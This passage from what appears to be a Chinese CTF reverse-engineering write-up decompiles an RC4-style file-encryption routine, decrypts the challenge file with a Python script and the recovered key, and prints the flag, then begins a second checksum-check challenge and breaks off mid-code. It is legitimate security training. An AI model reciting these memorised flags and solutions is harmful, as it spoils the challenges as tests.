v7<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">int</span> v8<span class=\"token punctuation\">;</span> <span class=\"token comment\">// xmm0_4</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token keyword\">int</span> v9<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token keyword\">char</span> v10<span class=\"token punctuation\">;</span> <span class=\"token comment\">// al</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">int</span> v12<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+0h] [ebp-138h]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token keyword\">char</span> v13<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+D3h] [ebp-65h]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token keyword\">char</span> v14<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+DFh] [ebp-59h]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">int</span> v15<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+E8h] [ebp-50h]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token keyword\">int</span> v16<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+F4h] [ebp-44h]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token keyword\">char</span> v17<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+103h] [ebp-35h]</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token keyword\">int</span> v18<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+10Ch] [ebp-2Ch]</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token keyword\">char</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+11Bh] [ebp-1Dh]</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token keyword\">int</span> v20<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+124h] [ebp-14h]</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token keyword\">int</span> v21<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+130h] [ebp-8h]</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token function\">sub_40117C</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>unk_40B027<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  v21 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  v20 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  v4 <span class=\"token operator\">=</span> <span class=\"token function\">fgetc</span><span class=\"token punctuation\">(</span>File<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  v5 <span class=\"token operator\">=</span> <span class=\"token function\">sub_401186</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>v12 <span class=\"token operator\">==</span> <span class=\"token operator\">&amp;</span>v12<span class=\"token punctuation\">,</span> v4<span class=\"token punctuation\">,</span> a1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> v6<span class=\"token punctuation\">;</span> i <span class=\"token operator\">!=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">=</span> v10 <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    v21 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>v21 <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">256</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    v18 <span class=\"token operator\">=</span> v20 <span class=\"token operator\">+</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v21 <span class=\"token operator\">+</span> a2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    v20 <span class=\"token operator\">=</span> v18 <span class=\"token operator\">%</span> <span class=\"token number\">256</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    v17 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v21 <span class=\"token operator\">+</span> a2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v21 <span class=\"token operator\">+</span> a2<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v18 <span class=\"token operator\">%</span> <span class=\"token number\">256</span> <span class=\"token operator\">+</span> a2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v20 <span class=\"token operator\">+</span> a2<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> v17<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    v16 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v20 <span class=\"token operator\">+</span> a2<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v21 <span class=\"token operator\">+</span> a2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    v15 <span class=\"token operator\">=</span> v16 <span class=\"token operator\">%</span> <span class=\"token number\">256</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    v14 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v16 <span class=\"token operator\">%</span> <span class=\"token number\">256</span> <span class=\"token operator\">+</span> a2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    v13 <span class=\"token operator\">=</span> v14 <span class=\"token operator\">^</span> i<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    v7 <span class=\"token operator\">=</span> <span class=\"token function\">fputc</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v14 <span class=\"token operator\">^</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> a4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    v8 <span class=\"token operator\">=</span> <span class=\"token function\">sub_401186</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>v12 <span class=\"token operator\">==</span> <span class=\"token operator\">&amp;</span>v12<span class=\"token punctuation\">,</span> v7<span class=\"token punctuation\">,</span> v5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    v9 <span class=\"token operator\">=</span> <span class=\"token function\">fgetc</span><span class=\"token punctuation\">(</span>File<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    v5 <span class=\"token operator\">=</span> <span class=\"token function\">sub_401186</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>v12 <span class=\"token operator\">==</span> <span class=\"token operator\">&amp;</span>v12<span class=\"token punctuation\">,</span> v9<span class=\"token punctuation\">,</span> v8<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">sub_401186</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> v5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>该函数类似于 RC4 的加解密，而文件猜测为 <code>enflag.txt</code>  的内容，密钥即为前面解出来的 <code>[Warnning]Access_Unauthorized</code></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Cipher <span class=\"token keyword\">import</span> ARC4</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> base64</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> pathlib <span class=\"token keyword\">import</span> Path</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">rc4_encrypt</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">,</span> key1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>        <span class=\"token comment\"># 加密</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    key <span class=\"token operator\">=</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>key1<span class=\"token punctuation\">,</span> encoding<span class=\"token operator\">=</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    enc <span class=\"token operator\">=</span> ARC4<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">isinstance</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        data <span class=\"token operator\">=</span> data<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    res <span class=\"token operator\">=</span> enc<span class=\"token punctuation\">.</span>encrypt<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    res<span class=\"token operator\">=</span>base64<span class=\"token punctuation\">.</span>b64encode<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">return</span> res</pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">rc4_decrypt</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">,</span> key1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>        <span class=\"token comment\"># 解密</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    data <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64decode<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    key <span class=\"token operator\">=</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>key1<span class=\"token punctuation\">,</span> encoding<span class=\"token operator\">=</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    enc <span class=\"token operator\">=</span> ARC4<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    res <span class=\"token operator\">=</span> enc<span class=\"token punctuation\">.</span>decrypt<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    res <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">,</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">return</span> res</pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    file_path <span class=\"token operator\">=</span> Path<span class=\"token punctuation\">(</span>__file__<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>parent <span class=\"token operator\">/</span> <span class=\"token string\">\"final\"</span> <span class=\"token operator\">/</span> <span class=\"token string\">\"enflag.txt\"</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>file_path<span class=\"token punctuation\">,</span><span class=\"token string\">\"rb\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        data <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    key <span class=\"token operator\">=</span> <span class=\"token string\">'[Warnning]Access_Unauthorized'</span>  <span class=\"token comment\"># 加密 key</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    encrypt_data <span class=\"token operator\">=</span> rc4_encrypt<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">,</span>key<span class=\"token punctuation\">)</span>     <span class=\"token comment\"># 加密方法</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'加密后:'</span><span class=\"token punctuation\">,</span>encrypt_data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'解密后:'</span><span class=\"token punctuation\">,</span>rc4_decrypt<span class=\"token punctuation\">(</span>encrypt_data<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>         <span class=\"token comment\"># 解密方法</span></pre></td></tr></tbody></table></figure><p>得到</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>加密后: b'w4KjJfZMNjtZzMTp8bUyGLGWrr8INQ=='</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>解密后: flag {RC4&amp;-&gt;ENc0d3F1le}</pre></td></tr></tbody></table></figure><p>因此，flag 为 <code>flag{RC4&amp;-&gt;ENc0d3F1le}</code></p>\n<h2 id=\"re3\"><a class=\"anchor\" href=\"#re3\">#</a> re3</h2>\n<p>打开，反汇编，得到</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  size_t v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rax</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">int</span> v5<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-134h] BYREF</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+10h] [rbp-130h]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">int</span> v7<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+14h] [rbp-12Ch]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">int</span> v8<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+18h] [rbp-128h]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token keyword\">int</span> v9<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+1Ch] [rbp-124h]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token keyword\">int</span> v10<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+20h] [rbp-120h]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">int</span> v11<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+24h] [rbp-11Ch]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token keyword\">int</span> v12<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+28h] [rbp-118h]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token keyword\">int</span> v13<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+2Ch] [rbp-114h]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">int</span> v14<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+30h] [rbp-110h]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token keyword\">int</span> v15<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+34h] [rbp-10Ch]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> __int64 v16<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+38h] [rbp-108h]</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token keyword\">int</span> v17<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+40h] [rbp-100h]</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token keyword\">char</span> s<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+60h] [rbp-E0h] BYREF</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token keyword\">char</span> v19<span class=\"token punctuation\">[</span><span class=\"token number\">107</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+65h] [rbp-DBh] BYREF</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token keyword\">char</span> dest<span class=\"token punctuation\">[</span><span class=\"token number\">104</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+D0h] [rbp-70h] BYREF</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> __int64 v21<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+138h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  v21 <span class=\"token operator\">=</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  v7 <span class=\"token operator\">=</span> <span class=\"token number\">80</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  v8 <span class=\"token operator\">=</span> <span class=\"token number\">64227</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  v9 <span class=\"token operator\">=</span> <span class=\"token number\">226312059</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  v10 <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1540056586</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  v11 <span class=\"token operator\">=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  v12 <span class=\"token operator\">=</span> <span class=\"token number\">16</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  v13 <span class=\"token operator\">=</span> <span class=\"token number\">3833</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>  v5 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"plz input the key:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>  <span class=\"token function\">__isoc99_scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\"</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>  v3 <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>  <span class=\"token function\">strncpy</span><span class=\"token punctuation\">(</span>dest<span class=\"token punctuation\">,</span> v19<span class=\"token punctuation\">,</span> v3 <span class=\"token operator\">-</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>  dest<span class=\"token punctuation\">[</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>  <span class=\"token function\">__isoc99_sscanf</span><span class=\"token punctuation\">(</span>dest<span class=\"token punctuation\">,</span> <span class=\"token string\">\"%x\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>  v17<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v7<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>  v17<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v8<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>  v17<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v9<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>  v17<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v10<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>  v17<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>v11 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">12</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> v12<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>  v17<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v13<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>  v17<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v5<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>  v16 <span class=\"token operator\">=</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> <span class=\"token number\">6</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>  <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> v16 <span class=\"token operator\">+=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>v17<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> v16 <span class=\"token operator\">&gt;</span> <span class=\"token number\">0xFFFF</span><span class=\"token punctuation\">;</span> v16 <span class=\"token operator\">=</span> v15 <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int16<span class=\"token punctuation\">)</span>v16 <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>      v14 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int16<span class=\"token punctuation\">)</span>v16<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>      v15 <span class=\"token operator\">=</span> v16 <span class=\"token operator\">&gt;&gt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v16 <span class=\"token operator\">==</span> <span class=\"token number\">0xFFFF</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"OK\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>  <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token 